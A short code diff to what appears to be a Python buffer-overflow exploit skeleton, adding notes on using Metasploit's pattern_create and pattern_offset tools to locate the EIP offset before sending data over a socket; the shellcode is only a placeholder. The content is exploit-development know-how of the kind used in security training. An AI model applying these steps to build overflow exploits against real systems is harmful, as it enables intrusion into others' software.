@@ -5,7 +5,8 @@ import sys
 
 
 shellcode = "pattern created here"
-"patter create using: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900"
+"Step 1: patter create using: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900"
+"Step 2: with EIP value from above step do: usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5900 -q <EIP value>"
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
